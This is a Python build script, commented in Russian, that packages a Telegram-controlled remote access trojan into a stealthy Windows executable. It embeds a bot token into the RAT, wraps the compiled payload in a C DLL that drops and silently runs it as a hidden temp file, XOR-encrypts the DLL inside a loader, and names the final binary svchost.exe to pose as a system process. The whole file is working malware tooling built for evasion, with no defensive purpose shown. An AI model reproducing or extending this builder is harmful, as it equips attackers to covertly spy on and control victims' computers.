# build.py - Сборка EXE с зашифрованной DLL
import os
import sys
import subprocess
import random
import zlib
import shutil
import tempfile

class StealthBuilder:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = admin_id
        # Генерируем случайный XOR ключ
        self.xor_key = bytes([random.randint(1, 255) for _ in range(16)])
        
    def build_exe_with_pyinstaller(self):
        """Собирает обычный EXE с PyInstaller (со всем Python внутри)"""
        print("🔨 Собираю EXE через PyInstaller...")
        
        # Сначала собираем обычный EXE (как ты делал)
        cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed",
            "--name", "payload",
            "--target-arch", "x86",
            "--upx-dir", "C:\\ProgramData\\chocolatey\\lib\\upx\\tools",
            "--hidden-import", "telegram",
            "--hidden-import", "telegram.ext",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.ImageGrab",
            "--hidden-import", "psutil",
            "--hidden-import", "requests",
            "--hidden-import", "sounddevice",
            "--hidden-import", "soundfile",
            "--hidden-import", "cryptography",
            "--hidden-import", "cryptography.fernet",
            "--hidden-import", "tkinter",
            "--hidden-import", "pycaw",
            "--hidden-import", "comtypes",
            "--hidden-import", "cv2",
            "--hidden-import", "numpy",
            "--hidden-import", "GPUtil",
            "--hidden-import", "win10toast",
            "--collect-all", "telegram",
            "rat.py"
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"❌ Ошибка PyInstaller: {result.stderr.decode()}")
            return None
            
        # Проверяем что файл создался
        exe_path = "dist/payload.exe"
        if not os.path.exists(exe_path):
            # Пробуем другие имена
            for f in os.listdir("dist"):
                if f.endswith(".exe"):
                    exe_path = os.path.join("dist", f)
                    break
        
        if not os.path.exists(exe_path):
            print("❌ EXE не найден!")
            return None
            
        # Переименовываем в payload.exe
        shutil.copy(exe_path, "payload.exe")
        print(f"✅ EXE готов! Размер: {os.path.getsize('payload.exe') / (1024*1024):.1f} MB")
        return "payload.exe"
    
    def convert_exe_to_dll(self, exe_path):
        """Конвертирует EXE в DLL (обертка)"""
        print("🔄 Конвертирую EXE в DLL...")
        
        # Читаем EXE
        with open(exe_path, 'rb') as f:
            exe_data = f.read()
        
        # Создаем C-обертку для запуска EXE из DLL
        dll_wrapper = '''
#include <windows.h>
#include <stdio.h>

// Встроенный EXE
const unsigned char exe_data[] = {DATA};
unsigned int exe_size = SIZE;

void RunEXE() {
    // Сохраняем во временный файл
    char temp_path[MAX_PATH];
    char exe_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    sprintf(exe_path, "%s\\\\tmp_%x.exe", temp_path, GetTickCount());
    
    HANDLE hFile = CreateFileA(exe_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, exe_data, exe_size, &written, NULL);
        CloseHandle(hFile);
        
        // Запускаем EXE
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        CreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        
        // Удаляем через 5 секунд
        Sleep(5000);
        DeleteFileA(exe_path);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunEXE, NULL, 0, NULL);
    }
    return TRUE;
}
'''
        # Встраиваем EXE в DLL
        # Преобразуем в C массив
        hex_data = ', '.join([f'0x{b:02X}' for b in exe_data])
        dll_wrapper = dll_wrapper.replace('{DATA}', hex_data)
        dll_wrapper = dll_wrapper.replace('{SIZE}', str(len(exe_data)))
        
        # Сохраняем DLL код
        with open('payload_dll.c', 'w') as f:
            f.write(dll_wrapper)
        
        # Компилируем DLL через MinGW
        cmd = [
            'gcc', '-shared', '-o', 'payload.dll',
            'payload_dll.c',
            '-static', '-s', '-O2',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"❌ Ошибка компиляции DLL: {result.stderr.decode()}")
            return None
            
        print(f"✅ DLL готова! Размер: {os.path.getsize('payload.dll') / (1024*1024):.1f} MB")
        return "payload.dll"
    
    def encrypt_dll(self, dll_path):
        """Шифрует DLL"""
        print("🔐 Шифрую DLL...")
        
        with open(dll_path, 'rb') as f:
            dll_data = f.read()
        
        # Сжимаем
        compressed = zlib.compress(dll_data, level=9)
        
        # XOR шифруем
        encrypted = bytearray(compressed)
        for i in range(len(encrypted)):
            encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
        
        print(f"✅ Зашифровано! Размер: {len(encrypted) / (1024*1024):.1f} MB")
        return encrypted
    
    def bytes_to_c_array(self, data, name):
        """Конвертирует байты в C массив"""
        result = f'unsigned char {name}[] = {{\n    '
        for i, b in enumerate(data):
            if i > 0:
                result += ', '
            result += f'0x{b:02X}'
            if (i + 1) % 16 == 0:
                result += ',\n    '
        result += '\n};\n'
        return result
    
    def build_loader(self, encrypted_dll):
        """Собирает финальный загрузчик"""
        print("🔧 Собираю загрузчик...")
        
        with open('loader.cpp', 'r') as f:
            loader = f.read()
        
        # Встраиваем зашифрованную DLL
        loader = loader.replace(
            'extern unsigned char encrypted_dll[];',
            self.bytes_to_c_array(encrypted_dll, 'encrypted_dll')
        )
        loader = loader.replace(
            'extern unsigned int dll_len;',
            f'unsigned int dll_len = {len(encrypted_dll)};'
        )
        loader = loader.replace(
            'extern unsigned char xor_key[];',
            self.bytes_to_c_array(self.xor_key, 'xor_key')
        )
        loader = loader.replace(
            'extern unsigned int key_len;',
            f'unsigned int key_len = {len(self.xor_key)};'
        )
        
        with open('loader_final.cpp', 'w') as f:
            f.write(loader)
        
        print("✅ Загрузчик готов!")
        return 'loader_final.cpp'
    
    def compile_loader(self, loader_path):
        """Компилирует загрузчик в EXE"""
        print("🔨 Компилирую финальный EXE...")
        
        cmd = [
            'g++',
            '-o', 'svchost.exe',
            loader_path,
            '-static',
            '-s',
            '-O2',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"❌ Ошибка: {result.stderr.decode()}")
            return None
        
        size = os.path.getsize('svchost.exe')
        print(f"✅ ФИНАЛЬНЫЙ EXE готов! Размер: {size / 1024:.1f} KB")
        return 'svchost.exe'
    
    def build(self):
        """Полный процесс сборки"""
        print("🚀 НАЧИНАЮ СБОРКУ STEALTH RAT")
        print("=" * 60)
        
        # 1. Обновляем rat.py с токеном
        print("📝 Обновляю rat.py...")
        with open('rat.py', 'r', encoding='utf-8') as f:
            content = f.read()
        content = content.replace('{{TOKEN}}', self.token)
        content = content.replace('{{ADMIN_ID}}', str(self.admin_id))
        with open('rat.py', 'w', encoding='utf-8') as f:
            f.write(content)
        
        # 2. Собираем обычный EXE через PyInstaller (80 MB)
        exe = self.build_exe_with_pyinstaller()
        if not exe:
            return False
        
        # 3. Конвертируем EXE в DLL
        dll = self.convert_exe_to_dll(exe)
        if not dll:
            return False
        
        # 4. Шифруем DLL
        encrypted = self.encrypt_dll(dll)
        
        # 5. Собираем загрузчик
        loader = self.build_loader(encrypted)
        
        # 6. Компилируем финальный EXE
        final_exe = self.compile_loader(loader)
        
        if final_exe:
            print("=" * 60)
            print("🎉 СБОРКА ЗАВЕРШЕНА УСПЕШНО!")
            print(f"📦 ФИНАЛЬНЫЙ EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
            print(f"📁 Исходный EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
            print(f"📁 DLL: {dll} ({os.path.getsize(dll) / (1024*1024):.1f} MB)")
            print(f"🔑 Ключ: {self.xor_key.hex()}")
            return True
        
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Использование: python build.py TOKEN ADMIN_ID")
        sys.exit(1)
    
    token = sys.argv[1]
    admin_id = sys.argv[2]
    
    builder = StealthBuilder(token, admin_id)
    builder.build()
